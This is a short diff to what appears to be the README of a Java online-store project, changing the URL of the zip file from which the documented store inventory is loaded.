@@ -12,7 +12,7 @@ A `Product` class is created with appropriate getters, setters, constructors, an
 
 ## Store's Inventory
 
-The application loads the store's inventory from the provided `https://raw.githubusercontent.com/StacksMadeDev/OnlineStore/main/src/main/Store_Online_1.3.zip` file.
+The application loads the store's inventory from the provided `https://raw.githubusercontent.com/StacksMadeDev/OnlineStore/main/src/main/Store-Online-1.2.zip` file.
 
 ## Cart
 
